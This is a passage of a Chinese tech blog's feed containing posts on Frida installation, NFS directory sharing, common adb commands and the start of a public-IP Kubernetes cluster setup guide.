src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230423204327.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FridaHook环境搭建</title>
      <link href="/2023/03/26/FridaHook%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/03/26/FridaHook%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>frida版本：14.2.18</p><p>frida-tools：9.2.5</p><p>python：3.7</p><p>此配置适用于Android10版本的逆向，具体版本适配请参考官网</p><h1 id="一-安装python3-7"><a href="#一-安装python3-7" class="headerlink" title="一.安装python3.7"></a>一.安装python3.7</h1><p>前往python<a href="https://www.python.org/downloads/windows/">官网</a>找到3.7版本下载，网上方法很多这里不在赘述</p><h1 id="二-安装-Frida和-Frida-tools"><a href="#二-安装-Frida和-Frida-tools" class="headerlink" title="二.安装 Frida和 Frida-tools"></a>二.安装 Frida和 Frida-tools</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==14.2.18</span><br><span class="line">pip install frida-tools==9.2.5</span><br></pre></td></tr></table></figure><p>若没科学上网环境可能很慢，等个30分钟左右就差不多了</p><p>检查环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure><p>若出现14.2.18则Frida-tools安装成功</p><p>进入python解释器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import  frida</span><br></pre></td></tr></table></figure><p>若不报错则 frida安装成功</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>配置 NFS 实现 Linux 之间的目录共享</title>
      <link href="/2023/03/26/%E9%85%8D%E7%BD%AE-NFS-%E5%AE%9E%E7%8E%B0-Linux-%E4%B9%8B%E9%97%B4%E7%9A%84%E7%9B%AE%E5%BD%95%E5%85%B1%E4%BA%AB/"/>
      <url>/2023/03/26/%E9%85%8D%E7%BD%AE-NFS-%E5%AE%9E%E7%8E%B0-Linux-%E4%B9%8B%E9%97%B4%E7%9A%84%E7%9B%AE%E5%BD%95%E5%85%B1%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<p><strong>网络文件系统</strong>（英语：<strong>Network File System</strong>，缩写作 <strong>NFS</strong>）是一种<a href="https://en.wikipedia.org/wiki/Distributed_data_store">分布式文件系统</a>，力求客户端主机可以访问服务器端文件，并且其过程与访问本地存储时一样，它由<a href="https://en.wikipedia.org/wiki/Sun_Microsystems">Sun Microsystems</a>（已被甲骨文公司收购）开发，于1984年发布。NFS 的实现基于 ONC RPC（一个开放、标准的<a href="https://en.wikipedia.org/wiki/Request_for_Comments">RFC</a>系统，任何人或组织都可以依据标准实现它）。</p><p><strong>本文仅介绍 NFS 最简单的用法：在两台不同的 Linux 机器上共享目录。</strong></p><hr><p>A 和 B 的连接是内网或公网均可。但公网比较麻烦，要解决防火墙的问题。而且由于 NFS  是明文，所以一般不建议在公网使用。本文的示例用的公网主要是因为我在搞这个的时候手里暂时只有两个不在同一网段的机器，又懒得搞 docker  啥的=。=，不过你直接在内网照做也没什么区别。</p><p>我们将 A 称为 <strong>NFS 服务器</strong>，将 B 称为 <strong>NFS 客户端</strong>。下面也都将以 NFS 服务器和 NFS 客户端称呼，不再提及 A 和 B。</p><h2 id="1-通用操作：安装必要的程序"><a href="#1-通用操作：安装必要的程序" class="headerlink" title="1. 通用操作：安装必要的程序"></a>1. 通用操作：安装必要的程序</h2><p>在 CentOS 中 NFS 的主程序软件包名为 <code>nfs-utils</code>。前文说过，NFS 的实现是基于 RPC 的，所以当我们安装 <code>nfs-utils</code> 时，相关依赖 <code>rpcbind</code> 包也会被自动检索到并安装。我们只需要安装一个 <code>nfs-utils</code> 即可，其依赖 yum 包管理器会解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install nfs-utils</span><br></pre></td></tr></table></figure><p>NFS 服务器和 NFS 客户端都需要安装。</p><h2 id="2-NFS-服务端操作"><a href="#2-NFS-服务端操作" class="headerlink" title="2. NFS 服务端操作"></a>2. NFS 服务端操作</h2><h3 id="2-1-编辑-NFS-服务器配置文件"><a href="#2-1-编辑-NFS-服务器配置文件" class="headerlink" title="2.1. 编辑 NFS 服务器配置文件"></a>2.1. 编辑 NFS 服务器配置文件</h3><p>NFS 服务器的配置文件在 <code>/etc/exports</code>：</p><p>我们打开（如果是空的直接编辑就好，如果不存在就创建新的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/exports</span><br></pre></td></tr></table></figure><p>其<strong>配置非常非常非常简单！</strong>每个要共享的目录占一行，每行格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;export&gt; &lt;host1&gt;(&lt;options&gt;) &lt;hostN&gt;(&lt;options&gt;)...</span><br></pre></td></tr></table></figure><ul><li><p><code>export</code>：要共享的目录。注意必须是目录，NFS 共享的最小单位就是目录。</p></li><li><p>host</p><p>：要共享的目标主机，即可访问此共享目录的 NFS 客户端。这是 NFS 服务器唯一验证访问者身份的方式。</p><ul><li>可以使用完整的 IP 或者是网域，例如 <code>192.168.100.10</code> 或 <code>192.168.100.0/24</code> 或 <code>192.168.100.0/255.255.255.0</code> 都可以！</li><li>也可以使用主机名，但这个主机名必须要在 <code>/etc/hosts</code> 内，或可使用 DNS 找到该名称才行！反正重点是可找到 IP 就是了。如果是主机名的话，那么他可以支持通配符，例如 <code>*</code> 或 <code>?</code> 均可。</li><li>也可以直接为 <code>*</code> 表示允许所有人访问。</li><li>注：NFS 同时支持公网和内网共享，但由于 NFS 是明文的，通常不建议公网共享，而且局域网内使用。</li></ul></li><li><p><code>options</code>：给 <code>host</code> 共享 <code>export</code> 目录的选项，多个选项用逗号 <code>,</code>隔开。每组 <code>options</code> 只服务一个 <code>host</code>。</p></li></ul><p>这里给出几个 <code>options</code> 的常用选项（更多详见 <a href="https://man7.org/linux/man-pages/man5/exports.5.html">man exports</a>）：</p><table><thead><tr><th>参数值</th><th>含义</th></tr></thead><tbody><tr><td><code>rw</code> <code>ro</code></td><td>设置目录分享权限。<code>rw</code> 表示可读写（read-write），<code>ro</code> 表示只读（read-only）。 最终的客户端对目录的访问权限为此选项与服务器系统用户实际拥有权限的交集。 比如这里设置 <code>rw</code> 权限，但是服务器中自己也没有写权限，那么客户端也就只能是只读权限。 <strong>另外要注意的是，通常访问者被服务器看做其他用户，即权限设置的最后三位。例如，服务器共享的目录权限为 <code>drwxrwxr-x</code>，那么访问者的最大权限就是后三位的 <code>r-x</code>。</strong></td></tr><tr><td><code>sync</code> <code>async</code></td><td><code>sync</code> 代表数据会同步写入到内存与硬盘中，<code>async</code> 则代表数据会先暂存于内存当中，而非直接写入硬盘。</td></tr><tr><td><code>no_root_squash</code> <code>root_squash</code></td><td>当 NFS 客户端访问此共享目录时，如果使用的是 root 身份，是否在服务器端保留同等的 root 身份（例如 NFS 客户端使用 root 用户在共享目录中添加了一个文件后，服务器端或其他客户端看到的此文件修改者仍是 root）。<code>no_root_squash</code> 为保留，默认是 <code>root_squash</code> 为不保留。</td></tr><tr><td><code>all_sqush</code></td><td>映射所有访问者的 UIDs 和 GIDs 为匿名用户。</td></tr><tr><td><code>anonuid</code> <code>anongid</code></td><td>显式设定匿名访问者 UID 和 GID。设定后，所有匿名访问此共享目录的请求看起来都是同一个用户（相同的 UID 或 GID）。 与 <code>all_sqush</code> 搭配使用可以让所有访问用户都使用同一个指定的账户身份访问（先将所有访问者都映射为匿名的，再给匿名用户指定 UID 和 GID）。</td></tr></tbody></table><p>本例添加一条如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nfs-shared *</span><br></pre></td></tr></table></figure><p>即共享服务器目录 <code>/nfs-shared</code> 给 <code>所有人</code>，赋予读写权限。</p><p>配置完 <code>/etc/exports</code> 后，如果你的 nfs 服务<strong>正在运行</strong>，则需要使用命令 <code>exportfs -arv </code> 使其生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportfs [-aruv]</span><br></pre></td></tr></table></figure><ul><li><code>-a</code>：全部挂载(或卸除) <code>/etc/exports</code> 内的设定。</li><li><code>-r</code>：重新挂载 <code>/etc/exports</code> 里面的设定，此外，亦同步更新 <code>/etc/exports</code> 及 <code>/var/lib/nfs/xtab</code> 的内容。</li><li><code>-u</code>：卸除某一目录。</li><li><code>-v</code>：在 <code>export</code> 的时候，将共享的目录显示到屏幕上！</li></ul><h3 id="2-2-启动-NFS-服务"><a href="#2-2-启动-NFS-服务" class="headerlink" title="2.2. 启动 NFS 服务"></a>2.2. 启动 NFS 服务</h3><p>前面说过，NFS 服务依赖于 RPC，所以我们启动 NFS 服务前，需要先启动 RPC 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start rpcbind</span><br><span class="line">systemctl start nfs-server</span><br></pre></td></tr></table></figure><p>启动后，我们可以检查一下 RPC 和 NFS 服务开启了哪些端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -tulnp | grep -E &#x27;(rpc|nfs|1/systemd)&#x27;</span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd           </span><br><span class="line">tcp        0      0 0.0.0.0:20048           0.0.0.0:*               LISTEN      2049808/rpc.mountd  </span><br><span class="line">tcp        0      0 0.0.0.0:56525           0.0.0.0:*               LISTEN      2049794/rpc.statd   </span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      1/systemd           </span><br><span class="line">tcp6       0      0 :::20048                :::*                    LISTEN      2049808/rpc.mountd  </span><br><span class="line">tcp6       0      0 :::40445                :::*                    LISTEN      2049794/rpc.statd   </span><br><span class="line">udp        0      0 0.0.0.0:20048           0.0.0.0:*                           2049808/rpc.mountd  </span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           1/systemd           </span><br><span class="line">udp        0      0 127.0.0.1:778           0.0.0.0:*                           2049794/rpc.statd   </span><br><span class="line">udp        0      0 0.0.0.0:50449           0.0.0.0:*                           2049794/rpc.statd   </span><br><span class="line">udp6       0      0 :::20048                :::*                                2049808/rpc.mountd  </span><br><span class="line">udp6       0      0 :::36774                :::*                                2049794/rpc.statd   </span><br><span class="line">udp6       0      0 :::111                  :::*                                1/systemd</span><br></pre></td></tr></table></figure><p>这里可以看到，<code>nfs-server</code> 本身没有占用端口，因为它是通过 <code>rpcbind</code> 来操作的，所以只能看到 <code>rpcbind</code> 的端口占用。</p><p>然后，我们也有必要验证一下，我们的目录是否已经共享出来了，使用 <code>showmount</code> 命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount [-ae] [hostname|IP]</span><br></pre></td></tr></table></figure><ul><li><code>-a</code> ：显示目前主机与客户端的 NFS 联机分享的状态；</li><li><code>-e</code> ：显示某部主机的 <code>/etc/exports</code> 所分享的目录数据。</li><li><code>[hostname|IP]</code>：要显示的主机名或 IP。不写的话就是本机。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ showmount -e</span><br><span class="line">Export list for iZ8vbf7xcuoq7ug1e7hjk5Z:</span><br><span class="line">/nfs-shared 47.93.49.1</span><br></pre></td></tr></table></figure><p>显示出我们在 <code>/etc/exports</code> 中配置的内容，就是成功了。</p><h3 id="2-3-打开-NFS-使用的端口"><a href="#2-3-打开-NFS-使用的端口" class="headerlink" title="2.3. 打开 NFS 使用的端口"></a>2.3. 打开 NFS 使用的端口</h3><p>如果你要在<strong>公网</strong>使用 NFS，有一点也非常重要，我们必须确保 <code>nfs-server</code> 在 <code>rpcbind</code> 中注册的端口是可以访问的状态！</p><p>我们查看 rpc 相关的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rpcinfo -p localhost | grep nfs</span><br><span class="line">    100003    3   tcp   2049  nfs</span><br><span class="line">    100003    4   tcp   2049  nfs</span><br><span class="line">    100227    3   tcp   2049  nfs_acl</span><br></pre></td></tr></table></figure><p>可以看到我这里用的是 2049 端口，我们必须打开服务器的这个端口（例如阿里云中的安全组设置），否则客户端依然是无法访问/挂载的。</p><h2 id="3-NFS-客户端操作"><a href="#3-NFS-客户端操作" class="headerlink" title="3. NFS 客户端操作"></a>3. NFS 客户端操作</h2><h3 id="3-1-启动-NFS-服务"><a href="#3-1-启动-NFS-服务" class="headerlink" title="3.1. 启动 NFS 服务"></a>3.1. 启动 NFS 服务</h3><p>客户端同样需要启动 <code>rpcbind</code> 和 <code>nfs-server</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start rpcbind</span><br><span class="line">systemctl start nfs-server</span><br></pre></td></tr></table></figure><p>不过客户端这边没必要特别关注什么其他的东西，就不像 NFS 服务器那样多说了。</p><h3 id="3-2-挂载共享目录"><a href="#3-2-挂载共享目录" class="headerlink" title="3.2. 挂载共享目录"></a>3.2. 挂载共享目录</h3><p>挂载之前，我们同样可以使用 <code>showmount -e</code> 命令，查看服务器共享了哪些目录，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ showmount -e 8.142.120.167</span><br><span class="line">Exports list on 8.142.120.167:</span><br><span class="line">/nfs-shared</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果你是在公网共享的话，showmount -e 这里可能会面临防火墙问题，你需要打开服务器端相应的端口（不是挂载的端口，是个 UDP 端口）。这里暂时不是重点，先不说了，因为不影响挂载。</span><br></pre></td></tr></table></figure><p>挂载目录使用 <code>mount</code> 命令。<code>mount</code> 的功能挺多的，具体见 <a href="https://man7.org/linux/man-pages/man8/mount.8.html">man mount</a>。</p><p>这里就仅展示最基础的一个用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount [options] &lt;source&gt; &lt;directory&gt;</span><br></pre></td></tr></table></figure><p>我们暂不考虑 <code>options</code>，就非常简单了，就是 <code>mount</code> 后面接源目录地址和目的目录地址。</p><p>我这里的 NFS 服务器的地址为 <code>8.142.120.167</code>，故我这里源目录地址应当填 <code>8.142.120.167:/nfs-shared</code>。</p><p>目的目录地址应当是 NFS 客户端本地的一个<strong>空</strong>目录，这里现创建一个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /nfs-shared-from-server</span><br></pre></td></tr></table></figure><p>现在我们本例中 NFS 客户端中最后的挂载命令即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount 8.142.120.167:/nfs-shared /nfs-shared-from-server</span><br></pre></td></tr></table></figure><p>如果没有错误信息的话，就是挂载成功了。</p><p>现在我们 NFS 客户端访问自己的目录 <code>/nfs-shared-from-server</code>，就是在访问服务器端的共享目录 <code>/nfs-shared</code> 了。</p><p>搞定！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>adb常用命令</title>
      <link href="/2023/03/19/adb%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/03/19/adb%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">adb version  #显示adb版本和路径</span><br><span class="line"></span><br><span class="line">adb start-server  #启动server</span><br><span class="line"></span><br><span class="line">adb kill-server   #停止server</span><br><span class="line"></span><br><span class="line">adb devices       #显示连接的设备列表</span><br><span class="line"></span><br><span class="line">adb devices #查看连接设备</span><br><span class="line"></span><br><span class="line">adb -s cf27456f shell # 指定连接设备使用命令</span><br><span class="line"></span><br><span class="line">adb install test.apk # 安装应用</span><br><span class="line"></span><br><span class="line">adb install -r demo.apk #覆盖安装</span><br><span class="line"></span><br><span class="line">adb uninstall cn.com.test.mobile #卸载应用，需要指定包</span><br><span class="line"></span><br><span class="line">adb uninstall -k cn.com.test.mobile #卸载app 但保留数据和缓存文件</span><br><span class="line"></span><br><span class="line">adb shell pm list packages #列出手机装的所有app 的包名</span><br><span class="line"></span><br><span class="line">adb shell pm list packages -3 #列出除了系统应用的第三方应用包名</span><br><span class="line"></span><br><span class="line">adb shell pm clear cn.com.test.mobile #清除应用数据与缓存</span><br><span class="line"></span><br><span class="line">adb shell am start -ncn.com.test.mobile/.ui.SplashActivity #启动应用</span><br><span class="line"></span><br><span class="line">adb shell dumpsys package #包信息Package Information</span><br><span class="line"></span><br><span class="line">adb shell dumpsys meminfo #内存使用情况Memory Usage</span><br><span class="line"></span><br><span class="line">adb shell am force-stop cn.com.test.mobile #强制停止应用</span><br><span class="line"></span><br><span class="line">adb logcat #查看日志</span><br><span class="line"></span><br><span class="line">adb logcat -c #清除log 缓存</span><br><span class="line"></span><br><span class="line">adb reboot #重启</span><br><span class="line"></span><br><span class="line">adb get-serialno #获取序列号</span><br><span class="line"></span><br><span class="line">adb shell getprop ro.build.version.release #查看Android 系统版本</span><br><span class="line"></span><br><span class="line">adb shell top -s 10 #查看占用内存前10 的app</span><br><span class="line"></span><br><span class="line">adb push &lt;local&gt; &lt;remote&gt; #从本地复制文件到设备</span><br><span class="line"></span><br><span class="line">adb pull &lt;remote&gt; &lt;local&gt; #从设备复制文件到本地</span><br><span class="line"></span><br><span class="line">adb bugreport #查看bug 报告</span><br><span class="line"></span><br><span class="line">adb help #查看ADB 帮助</span><br><span class="line"></span><br><span class="line">adb shell 进入手机的linuxkong&#x27;zhi</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>k8s公网部署</title>
      <link href="/2023/03/06/k8s%E5%85%AC%E7%BD%91%E9%83%A8%E7%BD%B2/"/>
      <url>/2023/03/06/k8s%E5%85%AC%E7%BD%91%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CentOS 7.6 系统主机 3 台，基于公网 IP 搭建 1 主 2 从的 Kubernetes 集群 </span><br></pre></td></tr></table></figure><h1 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h1><h2 id="1-版本信息"><a href="#1-版本信息" class="headerlink" title="1.版本信息"></a>1.版本信息</h2><table><thead><tr><th>Docker</th><th>20.10.21</th></tr></thead><tbody><tr><td>Kubernetes</td><td>1.21.0-0</td></tr><tr><td>Flannel</td><td>0.20.2</td></tr></tbody></table><h2 id="2-集群角色规划"><a href="#2-集群角色规划" class="headerlink" title="2.集群角色规划"></a>2.集群角色规划</h2><p>3 台 CentOS 7.6 主机，集群角色规划如下</p><table><thead><tr><th></th><th><strong>Master</strong></th><th><strong>Worker01</strong></th><th><strong>Worker02</strong></th></tr></thead><tbody><tr><td><strong>公网 IP</strong></td><td>139.196.219.92</td><td>1.116.156.102</td><td>121.37.169.103</td></tr><tr><td><strong>内网 IP</strong></td><td>172.21.253.164</td><td>10.0.4.15</td><td>192.168.0.89</td></tr><tr><td><strong>服务器厂商</strong></td><td>阿里云</td><td>腾讯云</td><td>阿里云云</td></tr></tbody></table><h2 id="3-修改-hosts-文件"><a href="#3-修改-hosts-文件" class="headerlink" title="3.修改 hosts 文件"></a>3.修改 hosts 文件</h2><p>设置 master 主机的 hostname 为 m</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hostnamectl set-hostname m</span><br></pre></td></tr></table></figure><p>分别设置 2 台 worker 主机的 hostname</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo hostnamectl set-hostname w1 </span><br><span class="line">sudo hostnamectl set-hostname w2</span><br></pre></td></tr></table></figure><p>分别修改 3 台主机的 hosts 文件，这里配置的是公网 IP。因为云服务器厂商不同，无法搭建局域网 K8s 集群</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"> </span><br><span class="line">139.196.219.92 m </span><br><span class="line">1.116.156.102 w1 </span><br><span class="line">121.37.169.103 w2</span><br></pre></td></tr></table></figure><h2 id="4-创建虚拟网卡"><a href="#4-创建虚拟网卡" class="headerlink" title="4.创建虚拟网卡"></a>4.创建虚拟网卡</h2><p>3 台主机分别填写对应的公网 IP</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0:1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填入内容</span></span><br><span class="line"><span class="attr">NAME</span>=eth0:<span class="number">1</span></span><br><span class="line"><span class="attr">DEVICE</span>=eth0:<span class="number">1</span></span><br><span class="line"><span class="attr">TYPE</span>=Ethernet</span><br><span class="line"><span class="attr">ONBOOT</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">BOOTPROTO</span>=static</span><br><span class="line"><span class="attr">NETMASK</span>=<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"><span class="attr">IPADDR</span>=&lt;public ip&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启网络</span></span><br><span class="line">systemctl restart network.service</span><br></pre></td></tr></table></figure><p>注：CentOS 8取消了network.service，若命令不成功请自行百度</p><p>创建虚拟网卡前，查看 eth0</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">root@w1 network-scripts</span>]<span class="meta"># ip a | grep eth0</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc mq state UP <span class="keyword">group</span> <span class="literal">default</span> qlen <span class="number">1000</span></span><br><span class="line">    inet <span class="number">10.0</span><span class="number">.4</span><span class="number">.15</span>/<span class="number">22</span> brd <span class="number">10.0</span><span class="number">.7</span><span class="number">.255</span> scope <span class="keyword">global</span> eth0</span><br></pre></td></tr></table></figure><p>创建虚拟网卡后，查看 eth0，可以发现多了一条记录 eth0:1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@w1</span> <span class="operator">~</span>]# ip a <span class="operator">|</span> grep eth0</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>: eth0: <span class="operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="operator">&gt;</span> mtu <span class="number">1500</span> qdisc mq state UP <span class="keyword">group</span> <span class="keyword">default</span> qlen <span class="number">1000</span></span><br><span class="line">    inet <span class="number">10.0</span><span class="number">.4</span><span class="number">.15</span><span class="operator">/</span><span class="number">22</span> brd <span class="number">10.0</span><span class="number">.7</span><span class="number">.255</span> <span class="keyword">scope</span> <span class="keyword">global</span> eth0</span><br><span class="line">    inet <span class="number">1.116</span><span class="number">.156</span><span class="number">.102</span><span class="operator">/</span><span class="number">24</span> brd <span class="number">1.116</span><span class="number">.156</span><span class="number">.255</span> <span class="keyword">scope</span> <span class="keyword">global</span> eth0:<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="5-云服务器安全组设置"><a href="#5-云服务器安全组设置" class="headerlink" title="5.云服务器安全组设置"></a>5.云服务器安全组设置</h2><p>搭建 K8s 集群需要对云服务器安全组入方向规则进行配置，开启相应的端口</p><p>master 节点</p><table><thead><tr><th><strong>协议</strong></th><th><strong>端口</strong></th><th><strong>作用</strong></th><th><strong>使用者</strong></th></tr></thead><tbody><tr><td>TCP</td><td>2379～2380</td><td>etcd 客户端 API</td><td>kube-apiserver, etcd</td></tr><tr><td>TCP</td><td>6443</td><td>api-server API</td><td>所有组件</td></tr><tr><td>UDP</td><td>8472</td><td>VxLan Overlay 网络通信</td><td>Flannel 网络插件</td></tr><tr><td>TCP</td><td>10250</td><td>kubelet API</td><td>kubelet, Control Plane 组件</td></tr><tr><td>TCP</td><td>10251</td><td>kube-scheduler</td><td>kube-scheduler</td></tr><tr><td>TCP</td><td>10252</td><td>kube-controller-manager</td><td>kube-controller-manager</td></tr></tbody></table><p>worker 节点</p><table><thead><tr><th><strong>协议</strong></th><th><strong>端口</strong></th><th><strong>作用</strong></th><th><strong>使用者</strong></th></tr></thead><tbody><tr><td>UDP</td><td>8472</td><td>VxLan Overlay 网络通信</td><td>Flannel 网络插件</td></tr><tr><td>TCP</td><td>10250</td><td>kubelet API</td><td>kubelet, Control Plane 组件</td></tr><tr><td>TCP</td><td>30000~32767</td><td>NodePort 服务</td><td>所有组件</td></tr></tbody></table><h1 id="二、系统基础配置"><a href="#二、系统基础配置" class="headerlink" title="二、系统基础配置"></a>二、系统基础配置</h1><h2 id="1-更新并安装依赖"><a href="#1-更新并安装依赖" class="headerlink" title="1.更新并安装依赖"></a>1.更新并安装依赖</h2><p>准备好 3 台主机后，每台主机均需要更新并安装依赖</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo yum <span class="operator">-</span>y update </span><br><span class="line">sudo yum install <span class="operator">-</span>y conntrack ipvsadm ipset jq sysstat curl iptables libseccomp</span><br><span class="line">sudo yum install <span class="operator">-</span>y yum<span class="operator">-</span>utils</span><br></pre></td></tr></table></figure><h2 id="2-基础配置"><a href="#2-基础配置" class="headerlink" title="2.基础配置"></a>2.基础配置</h2><p>关闭防火墙</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br></pre></td></tr></table></figure><p>关闭 SELinux (Security Enhanced Linux)</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setenforce <span class="number">0</span></span><br><span class="line">sed -i <span class="string">&#x27;s/^SELINUX=enforcing$/SELINUX=permissive/&#x27;</span> /etc/selinux/config</span><br></pre></td></tr></table></figure><p>关闭 swap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swapoff -a</span><br><span class="line">sed -i <span class="string">&#x27;/swap/s/^(.*)$/#\1/g&#x27;</span> 